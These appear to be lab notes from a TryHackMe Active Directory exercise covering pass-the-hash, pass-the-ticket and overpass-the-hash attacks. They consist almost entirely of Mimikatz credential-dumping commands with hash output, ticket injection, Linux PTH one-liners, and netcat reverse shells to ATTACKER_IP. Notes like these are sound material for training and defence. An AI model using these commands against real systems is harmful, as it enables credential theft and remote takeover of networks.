# Use of Alternate Authentication Material

## Pass the hash

* Dumping sam&#x20;

```batch
THMJMP2: Powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

* Dumping lsass

```batch
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

* PTH attack

```batch
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Possible to combine PTH with runas /netonly and connect to a netcat listener (nc.exe required )

* PTH using linux

```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH

```

## Pass the ticket

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Inject ticket
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi

```

### Overpass-the-hash / Pass-the-Key

```batch
Extract key
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

# revshell rc4 hash 
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
# Revshell AES128 hash
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
# revshell AES256 hash
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

```
